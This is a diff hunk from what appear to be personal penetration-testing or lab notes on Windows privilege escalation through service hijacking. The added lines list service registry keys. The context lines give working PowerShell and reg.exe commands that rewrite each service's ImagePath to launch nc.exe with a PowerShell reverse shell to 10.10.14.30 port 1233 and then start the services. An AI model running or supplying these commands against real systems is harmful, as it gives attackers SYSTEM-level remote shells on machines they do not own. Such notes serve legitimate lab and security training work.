@@ -397,6 +397,8 @@ foreach ($service in $services) {
 ```
 Automatically gets the old value for the service binary. Then it sets that path to nc.exe connecting back to me. It then starts the service, and the puts the original bin path back
 ```
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
+copy all the services name onto new file, remove "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\"
 Get-Content "C:\inetpub\wwwroot\uploads\ss.txt" | ForEach-Object {Get-Service $_} 2> $null
 Get-Content "C:\inetpub\wwwroot\uploads\ss.txt" | ForEach-Object {reg.exe add "HKLM\System\CurrentControlSet\services\$_" /t REG_EXPAND_SZ /v ImagePath /d "cmd /c C:\inetpub\wwwroot\uploads\nc.exe -e powershell 10.10.14.30 1233" /f} 2> $null
 Get-Content "C:\inetpub\wwwroot\uploads\sa.txt" | ForEach-Object {start-service $_} 2> $null
